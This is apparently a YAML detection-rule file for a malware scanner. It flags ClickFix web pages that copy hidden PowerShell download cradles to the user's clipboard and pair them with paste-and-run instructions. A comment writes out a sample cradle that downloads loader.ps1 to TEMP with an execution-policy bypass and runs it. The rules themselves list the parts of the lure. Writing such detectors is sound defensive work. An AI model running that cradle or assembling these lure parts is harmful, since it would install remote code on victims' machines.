# ClickFix pages that stage a hidden-window PowerShell IEX(WebClient.DownloadString)
# cradle on the clipboard. Matches the StopAndProtect-class infection prompt and
# future variants that keep the same Win+R paste-run delivery shape.
defaults:
  platforms: [windows]
  for: [html, javascript]
  attack: T1204.001,T1059.001,T1105
  mbc: B0030

traits:

  - id: powershell-hidden-ep-bypass-flags
    desc: PowerShell hidden window with -ep bypass
    crit: suspicious
    conf: 0.94
    if:
      type: text
      regex: '(?i)powershell(\.exe)?\s+(-w(indowstyle)?\s+hidden|-w\s+h).{0,40}-ep\s+bypass'

composite_rules:
  - id: clickfix-clipboard-webclient-iex-cradle
    desc: ClickFix clipboard stages hidden IEX DownloadString
    crit: hostile
    conf: 0.98
    all:
      - id: micro-behaviors/os/clipboard/write::browser-clipboard-write
      - id: micro-behaviors/process/interpreter/eval/direct::embedded-powershell-webclient-script-eval
      - id: powershell-hidden-ep-bypass-flags
    any:
      - id: objectives/execution/lure/clipboard/instruction::html-winr-shortcut-instruction
      - id: objectives/execution/lure/clipboard/instruction::paste-enter-instruction-generic
      - id: objectives/execution/lure/clipboard/page::remote-human-check-page
    near_bytes: 1600
# Sibling cradle that stages Invoke-WebRequest -OutFile to TEMP plus a policy
# bypass instead of hidden-window IEX DownloadString: `cmd /c start /min
# powershell -ep bypass -C "iwr http://host/loader.ps1 -OutFile $env:TEMP\..;
# & ..."` copied to the clipboard beside paste-run instructions. Any
# clipboard-write spelling counts: pages alias the document object and
# builders ship the page script as a string, so gating on writeText alone
# misses the execCommand form.
  - id: clickfix-clipboard-iwr-temp-execute-cradle
    desc: ClickFix clipboard stages IWR TEMP download-execute
    crit: hostile
    conf: 0.98
    for: [html]
    all:
      - id: micro-behaviors/communications/http/download/cli::embedded-iwr-outfile-download
      - id: micro-behaviors/process/argument/option::powershell-policy-bypass-argument
      - id: objectives/execution/lure/clipboard/instruction::remote-ctrlv-instruction
    any:
      - id: micro-behaviors/os/clipboard/write::browser-execcommand-copy
      - id: micro-behaviors/os/clipboard/write::browser-clipboarddata-setdata
      - id: micro-behaviors/os/clipboard/write::browser-clipboard-write
      - id: micro-behaviors/os/clipboard/write::browser-clipboard-copy-command
      - id: micro-behaviors/os/clipboard/write::browser-dom-clipboard-copy
